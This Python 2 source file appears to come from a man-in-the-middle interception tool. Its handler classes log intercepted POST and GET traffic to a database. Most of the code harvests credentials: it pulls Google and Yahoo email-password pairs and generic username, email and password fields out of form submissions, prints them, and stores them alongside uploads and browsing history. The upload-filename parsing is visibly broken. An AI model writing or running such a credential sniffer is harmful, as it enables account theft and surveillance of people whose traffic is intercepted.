from base import *
from bson.errors import InvalidDocument
import re

class PostMethod(Catcher):
    def __init__(self):
        super(PostMethod, self).__init__(methods=['POST'])

    def get_header(self, req, key):
        if key in req.headers and req.headers[key]:
            return req.headers[key][0]

    @catcher
    def any_post_data(self, flow):
        q = flow.request
        print "POST {0} {1}".format(q.host, q.path)
        # Don't care about empty body
        length = self.get_header(q, 'Content-Length')
        if length is None or int(length) == 0:
            return 0

        # is it upload?
        fact = self.is_upload(q)

        # is it some form/json data?
        if fact is None:
            data = self.guess_post_data(q)
            if data is not None:
                fact = self.is_login(q, data)

                # try to save the data anyway
                if fact is None:
                    fact = {
                        'kind': 'postdata',
                        'content': data.data,
                    }
            else:
                pass
                #print "POST unguessable: headers:{0} [[{1}]]".format(q.headers, q.get_decoded_content())

        if fact is None:
            return 0

        try:
            self.save(flow, fact)
        except Exception, err:
            print "POST document invalid: {0} Headers:{2} [[{1}]]".format(err, q.get_decoded_content(), q.headers)
            return 0
        return 1


    def is_upload(self, req):
        if not 'Content-Disposition' in req.headers:
            return None
        ct = req.headers['Content-Disposition'][0]
        if not ct.startswith('attachment'):
            return None

        filename = None
        m = re.search(r'filename=["]([^"]+)["]', 'attachment; filename="text.txt"')
        if m is not None:
            filename = m.groups()[0]

        fact = {
            'kind': 'upload',
            'mime': self.get_header(req, 'Content-Type'),
            'content': req.get_decoded_content(),
            'filename': filename
        }
        return fact


    def is_login(self, req, data):
        if req.host == "accounts.google.com":
            if 'Passwd' in data.data:
                fact  = {'kind': 'cred',
                         'id': data.val('Email'),
                         'email': data.val('Email'),
                         'password': data.val('Passwd'),
                         'provider': 'google'
                     }
                print "GOOGLE CRED", fact
                return fact

        elif req.host == "login.yahoo.com":
            if 'passwd' in data.data:
                fact = {'kind': 'cred',
                        'id': data.val('username'),
                        'email': data.val('username') + '@yahoo.com',
                        'password': data.val('passwd'),
                        'provider': 'yahoo'
                    }
                return fact
        elif req.host == "www.facebook.com":
            # here we get just some fbids, ignore
            return None
        else:
            password = None
            username = None
            email = None
            for k in data.data:
                if k.lower() in ['pass', 'passwd', 'password', '_pass']:
                    password = data.val(k)
                    continue
                if k.lower() in ['user','username','login', "_user"]:
                    username = data.val(k)
                    continue
                if k.lower() in ['email','mail']:
                    email = data.val(k)
                    continue

            if password or username or email:
                fact = {'kind': 'cred',
                        'id': username,
                        'email': email,
                        'password': password,
                        'provider': req.host
                        }
                print "Found credential:", fact
                return fact


class Get(Catcher):
    title_pattern = re.compile("<title *>([^<]*)</title>", re.MULTILINE | re.I)

    def __init__(self):
        super(Get, self).__init__(methods=['GET'])

    def find_title(self, req):
        if req.code != 200: return ''

        content = req.get_decoded_content()
        if not content: return ''

        found = self.title_pattern.search(content[0:1000])

        if found:

            title = found.groups()[0]
            codec = self.get_codec(req)
            if codec:
                print "Decoding with %s" % codec
                try:
                    title = title.decode(codec)
                except UnicodeDecodeError:
                    return None
            return title

        return None

    @catcher
    def save_url_and_query(self, flow):
        if not self.is_content_type(flow.response, 'text/html'):
            return
        gd = GetData(flow.request.path)
        fact = {
            'path': gd.path,
            'query': gd.data,
            'query_string': gd.query,
            'kind': 'get',
            'title': self.find_title(flow.response)
        }
        self.save(flow, fact)
